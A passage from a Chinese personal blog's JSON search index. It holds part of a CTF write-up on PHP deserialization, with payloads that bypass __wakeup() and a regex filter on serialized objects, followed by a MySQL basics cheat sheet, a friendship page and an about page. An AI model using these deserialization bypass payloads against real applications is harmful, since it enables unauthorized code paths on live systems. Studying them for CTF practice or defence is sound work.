12//将上面的对象属性个数值改成逼真实个数打O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 例： 123456class xctf&#123;public $flag = &#x27;111&#x27;;public function __wakeup()&#123;exit(&#x27;bad requests&#x27;);&#125;?code= _wakeup()是一个魔法方法，_wakeup()会直接退出，并输出” bad requests “ 末尾有”?code&#x3D; “ ，因此要构造url来绕过_wakeup()这个函数。 最后将其序列化： 1234567891011121314151617181920212223242526272829&lt;?phpclass xctf&#123;public $flag = &#x27;111&#x27;;public function __wakeup()&#123;exit(&#x27;bad requests&#x27;);&#125;&#125;//?code=$a = new xctf();//序列化数组$s = serialize($a);echo $s;//输出结果：a:3:&lt;?phpclass xctf&#123;public $flag = &#x27;111&#x27;;public function __wakeup()&#123;exit(&#x27;bad requests&#x27;);&#125;&#125;//?code=$a = new xctf();//序列化数组$s = serialize($a);echo $s;/*输出结果： O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;&#125; 此时构造payload：O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;*/?&gt; 反序列化的绕过 绕过 /[oc]:\\d+:/i 过滤，/[oc]:\\d+:/i 会过滤 O：d 因此我们需要在之间加一个 + 以退出匹配来,例如 O:+d","categories":[{"name":"CTF","slug":"CTF","permalink":"http://sourcerev.github.io/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"http://sourcerev.github.io/tags/web/"},{"name":"反序列化","slug":"反序列化","permalink":"http://sourcerev.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"mysql基础","slug":"mysql","date":"2022-09-14T08:47:47.000Z","updated":"2023-04-12T12:12:24.639Z","comments":true,"path":"2022/09/14/mysql/","link":"","permalink":"http://sourcerev.github.io/2022/09/14/mysql/","excerpt":"","text":"基本语法外部语法远程连接数据库12//本机可填localhost&gt;mysql -uroot -p123456 -h 服务端地址 默认以utf8来创建数据库123&gt;vim /etc/my.cnf//在[mysqld]随即一行添加如下:character_set_server=utf8 创建特殊的数据库名 含有非法字符、保留关键字的处理方法 1234#利用反引号将名字括起来create database `test-abc`#但实际是将字符转化为特殊符号进行储存`test-abc` = test@cabc 数据库名称中不能含有 \\ / : ? * &lt; &gt; | 等字符 数据库不能重名 内部语法测试网站是否支持php1234vim index.php//探针文件&lt;?php phpinfo();?&gt; 更改文件权限1# chown apache.apache 目标文件名/ -R 免登录执行指令1mysql -uroot -p123456 -e &quot;执行命令&quot; 增加12345678create database 数据库名 #创建一个新的数据库show create database 数据库名 #查看创建的过程create database 数据库名 CHARACTER SET utf8 #以utf-8的格式创建数据库create database if not exists 数据库名; #如果不存在则创建该数据库#字段：insert into (数据库名.)表名 values (每一个字段所要赋的值);#数据库表中插入字段insert into (数据库名.)表名 values (每一个字段所要赋的值),(同前);#数据库表中插入多个字段 查询select: 1234567select database();#查询当前正在使用的数据库select now(); #输出系统当前时间select user(); #输出当前使用数据库的使用者select * from (数据库名.)表名;#查询表中所有字段select * from (数据库名.)表名\\G;#查询表中所有字段(按行输出)select * from 表名 where 字段 is null;#当字段赋值为空时进行的查询select distinct 字段 from 表名;#去重查询 desc: 1desc 表名; #查看表的结构 删除drop: 123drop database 数据库名; #删除数据库drop database `数据库名`;#删除带特殊符号的数据库drop database if exists 数据库名; #如果数据库存在，则删除它 delete: 12delete from 表名 [where 筛选条件(例如：age=21 and id=3)];delete * from 表名 where 字段 is null;#当字段赋值为空时进行的删除 修改alter: 12345678alter table 表名 rename 字段; #修改数据库的表名alter table 表名 modify 需要修改的字段 int(数值); #修改表中字段的长度（表的结构）alter table 表名 change 旧字段 新字段 类型(例如：varchar(30));#修改表中的字段名alter table 表名 add 新字段 enum(); #从表末新增表名，同时给表定义一个枚举的类型alter table 表名 add 新字段 int(20) first; #从表头新增表名，同时给表定义整形alter table 表名 add 新字段 int(20) after 字段; #从指定的位置后新增表名，同时给表定义整形alter table 表名 drop 字段名;#删除字段，内容也被清除 change和modify的区别CHANGE 对列进行重命名和更改列的类型，需给定旧的列名称和新的列名称、当前的类型。 MODIFY 可以改变列的类型，此时不需要重命名（不需给定新的列名称）。 update: 1update 表名 set 字段=&#x27;123&#x27; where id=5; 基本信息在mysql-&gt;user的表中存放root用户的许可信息，可以限制远程连接主机的权限。 sql基本函数group_concat() 函数：用于将SQL语句的结果拼接在一起，如果我们的查询结果多于一个就需要将这些结果拼接出来 sql的基本认识information_schema 库：这个库是在MySql 5.0之后的一个库，用来存放整个数据库的信息，里面可以查询到 所有的库名，表名，列名","categories":[{"name":"开发","slug":"开发","permalink":"http://sourcerev.github.io/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://sourcerev.github.io/tags/MySQL/"}]},{"title":"五湖四海之路","slug":"PY","date":"2022-09-14T04:00:00.000Z","updated":"2023-04-12T13:24:32.154Z","comments":true,"path":"/PY.html","link":"","permalink":"http://sourcerev.github.io/PY.html","excerpt":"","text":"或者是缘分，也许是巧合，人与人之间的友谊又是那么简单。 有时是一句一句单纯的问候，有时是那一句句的祝福与安慰，曾记得我们并肩走过的的每一段幸福的旅程，记得我们每一次的喜怒哀乐。 有人说友情就像一杯白开水，单纯、又洁白。 我一切的不愉快抛开脑后，望向诗和远方。 我们的友谊不需要誓言，更不需要相互的礼物，只需要相互那句深深的祝福，这也许没有礼物的的珍贵，却是一句最真诚的、温馨的祝福。 我の朋友们","categories":[],"tags":[]},{"title":"文章归档界面","slug":"archives","date":"2022-09-14T04:00:00.000Z","updated":"2023-04-12T13:03:17.131Z","comments":true,"path":"/archive.html","link":"","permalink":"http://sourcerev.github.io/archive.html","excerpt":"","text":"","categories":[],"tags":[]},{"title":"关于博主","slug":"about","date":"2022-09-14T04:00:00.000Z","updated":"2023-04-12T12:11:58.334Z","comments":true,"path":"/about.html","link":"","permalink":"http://sourcerev.github.io/about.html","excerpt":"此为简单的个人简介","text":"此为简单的个人简介 whoami一个ACM和CTF的双修摸鱼选手(๑•̀ㅂ•́)و✧","categories":[],"tags":[]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://sourcerev.github.io/categories/CTF/"},{"name":"机器学习","slug":"机器学习","permalink":"http://sourcerev.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"ACM","slug":"ACM","permalink":"http://sourcerev.github.io/categories/ACM/"},{"name":"开发","slug":"开发","permalink":"http://sourcerev.github.io/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"web","slug":"web","permalink":"http://sourcerev.github.io/tags/web/"},{"name":"SSTI","slug":"SSTI","permalink":"http://sourcerev.github.io/tags/SSTI/"},{"name":"SSRF","slug":"SSRF","permalink":"http://sourcerev.github.io/tags/SSRF/"},{"name":"pwn","slug":"pwn","permalink":"http://sourcerev.github.io/tags/pwn/"},{"name":"算法","slug":"算法","permalink":"http://sourcerev.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"神经网络","slug":"神经网络","permalink":"http://sourcerev.github.io/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"DP","slug":"DP","permalink":"http://sourcerev.github.io/tags/DP/"},{"name":"反序列化","slug":"反序列化","permalink":"http://sourcerev.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"pickle","slug":"pickle","permalink":"http://sourcerev.github.io/tags/pickle/"},{"name":"Yii模板","slug":"Yii模板","permalink":"http://sourcerev.github.io/tags/Yii%E6%A8%A1%E6%9D%BF/"},{"name":"Laravel","slug":"Laravel","permalink":"http://sourcerev.github.io/tags/Laravel/"},{"name":"MySQL","slug":"MySQL","permalink":"http://sourcerev.github.io/tags/MySQL/"}]}